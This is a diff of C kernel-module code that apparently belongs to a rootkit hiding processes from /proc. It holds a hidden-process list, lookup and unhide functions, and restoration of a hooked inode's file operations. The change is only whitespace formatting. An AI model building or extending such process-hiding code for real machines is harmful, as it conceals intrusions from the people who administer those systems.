@@ -76,7 +76,7 @@ int hide_proc_exit(void)
 	p_inode = p.dentry->d_inode;
 	p_inode->i_fop = p_old_fop;
 
-	list_for_each_safe(l, n, &hidden_proc_list) {
+	list_for_each_safe (l, n, &hidden_proc_list) {
 		proc = list_entry(l, struct hidden_proc, list);
 		list_del(&proc->list);
 		kfree(proc->name);
@@ -123,7 +123,7 @@ int unhide_proc(const char *proc_name)
 	struct list_head *n;
 	struct hidden_proc *proc;
 
-	list_for_each_safe(l, n, &hidden_proc_list) {
+	list_for_each_safe (l, n, &hidden_proc_list) {
 		proc = list_entry(l, struct hidden_proc, list);
 		if (strncmp(proc_name, proc->name, strlen(proc->name)) == 0) {
 			list_del(&proc->list);
@@ -139,7 +139,7 @@ int unhide_proc(const char *proc_name)
 bool is_proc_hidden(const char *proc_name)
 {
 	struct hidden_proc *p = NULL;
-	list_for_each_entry(p, &hidden_proc_list, list) {
+	list_for_each_entry (p, &hidden_proc_list, list) {
 		if (strncmp(proc_name, p->name, strlen(p->name)) == 0) {
 			return true;
 		}
